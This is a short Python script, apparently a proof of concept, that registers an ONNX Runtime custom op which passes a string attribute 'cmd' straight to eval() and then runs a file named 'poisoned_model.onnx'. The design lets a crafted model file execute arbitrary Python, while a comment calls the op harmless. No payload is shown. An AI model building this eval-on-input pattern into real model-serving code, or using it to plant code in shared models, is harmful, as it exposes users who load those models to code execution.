# hello_onnx_custom_op_ir11.py
# pip install onnx onnxruntime-extensions

import numpy as np
import onnx
from onnx import helper, TensorProto
import onnxruntime as ort
from onnxruntime_extensions import onnx_op, PyCustomOpDef, get_library_path

# 1) Define a Python custom op that prints and returns a dummy float tensor
@onnx_op(op_type="HelperOp", inputs=[], outputs=[PyCustomOpDef.dt_float], attrs={"cmd": PyCustomOpDef.dt_string})
def helper_op(**kwargs):
    eval(kwargs['cmd'])
    return np.array([42.0], dtype=np.float32)

# 3) Run it with ONNX Runtime + register the extensions library
so = ort.SessionOptions()
so.register_custom_ops_library(get_library_path())  # enables Python custom ops

sess = ort.InferenceSession("poisoned_model.onnx", sess_options=so, providers=["CPUExecutionProvider"])
# outputs = sess.run(None, {})

seq_len = 8
feed = {
    "input_ids":       np.zeros((1, seq_len), dtype=np.int64),
    "attention_mask":  np.ones((1, seq_len), dtype=np.int64),
    "token_type_ids":  np.zeros((1, seq_len), dtype=np.int64),
}

# Only fetch our custom output to keep execution minimal
print(sess.run(None, feed))
